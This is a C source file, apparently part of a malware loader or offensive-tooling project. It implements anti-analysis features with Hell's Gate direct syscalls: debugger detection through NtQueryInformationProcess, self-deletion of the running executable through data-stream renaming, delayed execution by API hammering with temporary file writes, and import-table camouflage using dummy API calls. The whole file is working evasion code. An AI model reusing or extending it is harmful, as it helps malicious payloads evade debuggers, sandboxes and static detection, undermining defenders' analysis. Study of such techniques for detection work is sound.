/*
 *  ~ antianalysis.c ~
 * Function implementations for anti-analysis features like debugger detection, self-deletion and delayed execution
 * Author: jakobfriedl
 */

#include "base.h"

BOOL DebuggerDetected(IN PVX_TABLE pVxTable) {

    PRINTA("\n[~~~] Checking for debugger... "); 

    NTSTATUS STATUS = NULL;
    DWORD64 dwIsDebuggerPresent = NULL;
    DWORD64 dwProcessDebugObject = NULL;
    HANDLE hCurrentProcess = (HANDLE)-1;

    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag, https://ntdoc.m417z.com/ntqueryinformationprocess
    HellsGate(pVxTable->NtQueryInformationProcess.wSystemCall);
    STATUS = HellDescent(hCurrentProcess, ProcessDebugPort, &dwIsDebuggerPresent, sizeof(DWORD64), NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtQueryInformationProcess] [1]");
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means that a debugger has been detected
    if (dwIsDebuggerPresent != NULL) {
        return TRUE;
    }

    // Calling NtQueryInformationProcess with the 'ProcessDebugObjectHandle' flag
    HellsGate(pVxTable->NtQueryInformationProcess.wSystemCall);
    STATUS = HellDescent(hCurrentProcess, ProcessDebugObjectHandle, &dwProcessDebugObject, sizeof(DWORD64), NULL);
    if (STATUS != STATUS_SUCCESS && STATUS != 0xC0000353) { // 0xC0000353 = STATUS_PORT_NOT_SET
        PRINT_NTERROR("HellDescent [NtQueryInformationProcess] [2]");
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means that a debugger has been detected
    if (dwProcessDebugObject != NULL) {
        return TRUE;
    }

    return FALSE;
}

BOOL SelfDelete(IN PVX_TABLE pVxTable) {

    PRINTA("\n[~~~] Self-deleting...\n"); 

    BOOL bState = TRUE;
    NTSTATUS STATUS = NULL;

    WCHAR szPath[MAX_PATH * 2] = { 0 };
    WCHAR szNtPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFORMATION Delete = { 0 };

    PFILE_RENAME_INFO pRename = NULL;
    LPCWSTR lpNewStream = L":NEW";
    SIZE_T sStreamLenght = wcslen(lpNewStream) * sizeof(wchar_t);
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sStreamLenght;

    HANDLE hFile = INVALID_HANDLE_VALUE;

    OBJECT_ATTRIBUTES OA = { 0 };
    UNICODE_STRING objName = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };

    /// Setup
    // Allocate buffer for FILE_RENAME_INFO structure
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        PRINT_ERROR("HeapAlloc");
        bState = FALSE;
        goto CLEANUP;
    }

    // Cleanup structures
    ZeroMemoryEx(&szPath, sizeof(szPath));
    ZeroMemoryEx(&Delete, sizeof(FILE_DISPOSITION_INFO));

    // Mark file for deletion
    Delete.DeleteFile = TRUE;

    // Set new data stream name buffer and size in the FILE_RENAME_INFO structure
    pRename->FileNameLength = sStreamLenght;
    CopyMemoryEx(pRename->FileName, lpNewStream, sStreamLenght);

    // Get current file name
    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH * 2)) {
        PRINT_ERROR("GetModuleFileNameW");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY_W(L"Got current file name: %s.", szPath);

    // The NtCreateFile syscall needs the path as part of the ObjectAttributes structure in the following format
    // \??\C:\...\...
    // The following prepends the \??\ to the path.
    swprintf_s(szNtPath, MAX_PATH * 2, L"\\??\\%s", szPath);

    /// Rename data stream 
    // Copy the path to a UNICODE_STRING structure to use as the ObjectName
    RtlInitUnicodeString(&objName, szNtPath);
    // Initialize ObjectAttributes with the objName structure containing the path
    InitializeObjectAttributes(&OA, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Retrieve file handle using NtCreateFile, https://ntdoc.m417z.com/ntcreatefile
    HellsGate(pVxTable->NtCreateFile.wSystemCall);
    STATUS = HellDescent(&hFile, DELETE | SYNCHRONIZE, &OA, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtCreateFile]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] Got file handle.", hFile);

    // Rename, https://ntdoc.m417z.com/ntsetinformationfile + FileRenameInformation flag
    HellsGate(pVxTable->NtSetInformationFile.wSystemCall);
    STATUS = HellDescent(hFile, &IoStatusBlock, pRename, sRename, FileRenameInformation);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtSetInformationFile] [1]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY_W(L"Renamed :DATA to %s.", lpNewStream);

    CloseHandle(hFile);

    /// Deleting the data stream
    // Open file handle again
    HellsGate(pVxTable->NtCreateFile.wSystemCall);
    STATUS = HellDescent(&hFile, DELETE | SYNCHRONIZE, &OA, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtCreateFile]");
        bState = FALSE;
        goto CLEANUP;
    }
    OKAY("[ 0x%p ] Got file handle.", hFile);

    // Mark for deletion after file handle is closed, https://ntdoc.m417z.com/ntsetinformationfile + FileDispositionInformation flag
    HellsGate(pVxTable->NtSetInformationFile.wSystemCall);
    STATUS = HellDescent(hFile, &IoStatusBlock, &Delete, sizeof(Delete), FileDispositionInformation);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtSetInformationFile] [2]");
        bState = FALSE;
        goto CLEANUP;
    }

    HellsGate(pVxTable->NtClose.wSystemCall);
    STATUS = HellDescent(hFile);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("HellDescent [NtClose] [2]");
        bState = FALSE;
        goto CLEANUP;
    }

    OKAY("Deleted.");

CLEANUP:

    HeapFree(GetProcessHeap(), 0, pRename);

    return bState;
}

BOOL ApiHammering(IN PVX_TABLE pVxTable, IN DWORD dwStress) {

    PRINTA("\n[~~~] Delaying execution via API Hammering...\n");

    BOOL bState = TRUE;
    NTSTATUS STATUS = NULL; 

    WCHAR szPath[MAX_PATH * 2];
    WCHAR szTmpPath[MAX_PATH];

    HANDLE hRFile = INVALID_HANDLE_VALUE;
    HANDLE hWFile = INVALID_HANDLE_VALUE;

    DWORD dwBytesRead = NULL;
    DWORD dwBytesWritten = NULL;

    PBYTE pRandBuffer = NULL;
    SIZE_T sBufferSize = 0xFFFFF; // 1048575 byte

    INT Random = 0;

    OBJECT_ATTRIBUTES OA = { 0 };
    UNICODE_STRING objName = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    LARGE_INTEGER offset;
    offset.QuadPart = 0;

    // Get path to tmp folder
    if (!GetTempPathW(MAX_PATH, szTmpPath)) {
        PRINT_ERROR("GetTempPathW");
        bState = FALSE;
        goto CLEANUP;
    }

    // Format file path for NtCreateFile
    wsprintf(szPath, L"\\??\\%s%s", szTmpPath, API_HAMMERING_TMPFILENAME);

    // Copy the path to a UNICODE_STRING structure to use as the ObjectName
    RtlInitUnicodeString(&objName, szPath);
    // Initialize ObjectAttributes with the objName structure containing the path
    InitializeObjectAttributes(&OA, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Execute "dwStress"-times
    for (SIZE_T i = 0; i < dwStress; i++) {

        // Create file in write mode with NtCreateFile, https://ntdoc.m417z.com/ntcreatefile
        HellsGate(pVxTable->NtCreateFile.wSystemCall); 
        // FILE_SUPERSEDE - If file exists, deletes it before creation of new one.
        STATUS = HellDescent(&hWFile, GENERIC_WRITE | SYNCHRONIZE, &OA, &IoStatusBlock, NULL, FILE_ATTRIBUTE_TEMPORARY, FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, 0, NULL);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtCreateFile] [1]"); 
            bState = FALSE; 
            goto CLEANUP; 
        }

        // Generate random data
        pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
        srand(time(NULL));
        Random = rand() % 0xFF;
        memset(pRandBuffer, Random, sBufferSize);

        // Write random data to file with NtWriteFile, https://ntdoc.m417z.com/ntwritefile
        HellsGate(pVxTable->NtWriteFile.wSystemCall); 
        STATUS = HellDescent(hWFile, NULL, NULL, NULL, &IoStatusBlock, pRandBuffer, sBufferSize, &offset, NULL);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtWriteFile]"); 
            bState = FALSE;
            goto CLEANUP; 
        }

        // Close handle 
        ZeroMemoryEx(pRandBuffer, sBufferSize);

        HellsGate(pVxTable->NtClose.wSystemCall);
        STATUS = HellDescent(hWFile); 
        if (STATUS != STATUS_SUCCESS) {
            PRINT_ERROR("HellDescent [NtClose] [1]"); 
            bState = FALSE;
            goto CLEANUP; 
        }

        // Open file in read mode and mark as to-be-deleted
        HellsGate(pVxTable->NtCreateFile.wSystemCall);
        STATUS = HellDescent(&hRFile, GENERIC_READ | SYNCHRONIZE, &OA, &IoStatusBlock, NULL, FILE_ATTRIBUTE_TEMPORARY, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, 0, NULL);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtCreateFile] [1]");
            bState = FALSE;
            goto CLEANUP;
        }

        // Read data from file
        HellsGate(pVxTable->NtReadFile.wSystemCall); 
        STATUS = HellDescent(hRFile, NULL, NULL, NULL, &IoStatusBlock, pRandBuffer, sBufferSize, &offset, NULL); 
        if (STATUS != STATUS_SUCCESS) {
            PRINT_NTERROR("HellDescent [NtReadFile]"); 
            bState = FALSE;
            goto CLEANUP; 
        }

        // Freeing the buffer
        ZeroMemoryEx(pRandBuffer, sBufferSize);
        HeapFree(GetProcessHeap(), NULL, pRandBuffer);

        // Close handle and delete file
        HellsGate(pVxTable->NtClose.wSystemCall);
        STATUS = HellDescent(hRFile);
        if (STATUS != STATUS_SUCCESS) {
            PRINT_ERROR("HellDescent [NtClose] [2]");
            bState = FALSE;
            goto CLEANUP;
        }
    }

CLEANUP:
    return bState;
}

/// IAT Camouflage
// Generate a random compile-time seed
int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
}

// A dummy function that makes the if-statement in 'IatCamouflage' interesting
PVOID Helper(PVOID* ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    // setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

    // saving the base address by pointer, and returning it 
    *ppAddress = pAddress;
    return pAddress;
}

// Function that imports WinAPIs but never uses them
VOID IatCamouflage() {

    PVOID	pAddress = NULL;
    int* A = (int*)Helper(&pAddress);

    // Impossible if-statement that will never run
    if (*A > 350) {

        // Random whitelisted WinAPIs
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }

    // Freeing the buffer allocated in 'Helper'
    HeapFree(GetProcessHeap(), 0, pAddress);
}